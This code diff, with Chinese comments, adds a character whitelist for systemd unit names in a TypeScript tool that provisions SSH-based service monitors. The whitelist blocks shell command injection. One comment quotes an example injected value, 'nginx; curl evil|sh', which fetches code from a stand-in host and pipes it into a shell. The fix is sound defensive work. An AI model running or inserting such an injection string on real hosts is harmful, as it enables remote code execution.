@@ -23,6 +23,9 @@ export type ProvisionInput = {
 /** unit 只在 systemd 模板里有：建完要拿 id 写回 host-services.json 的映射。 */
 export type PlannedMonitor = { name: string; payload: Record<string, unknown>; unit?: string }
 
+/** systemd 单元名白名单：systemctl 认的字符集，故意不含空格、分号、引号、$ 与反引号。 */
+const UNIT_RE = /^[A-Za-z0-9_.@:-]+$/
+
 /** 观测项名字（前缀 = 组短名，观测页会剥掉）。 */
 function monitorName(groupName: string, hostId: string, tail: string): string {
   const short = shortGroup(groupName) || hostId
@@ -61,6 +64,9 @@ export function planMonitors(input: ProvisionInput): PlannedMonitor[] {
     const unit = String(svc.unit ?? '').trim()
     const ssh = svc.ssh
     if (!unit) throw new Error('systemd 服务缺单元名')
+    // unit 会拼进 ssh_command（'systemctl is-active ' + unit），Kuma 在目标机上按 shell 执行；
+    // 不卡字符集的话 'nginx; curl evil|sh' 会真的跑起来（坑 49）。
+    if (!UNIT_RE.test(unit)) throw new Error('单元名只能是字母、数字、点、下划线、@、冒号、短横线：' + unit)
     if (!address) throw new Error('缺少主机地址，systemd 探测没法建')
     if (!ssh || !String(ssh.user ?? '').trim()) throw new Error('systemd 探测需要 SSH 用户名')
     if (!String(ssh.key ?? '').trim()) throw new Error('systemd 探测需要 SSH 私钥内容')
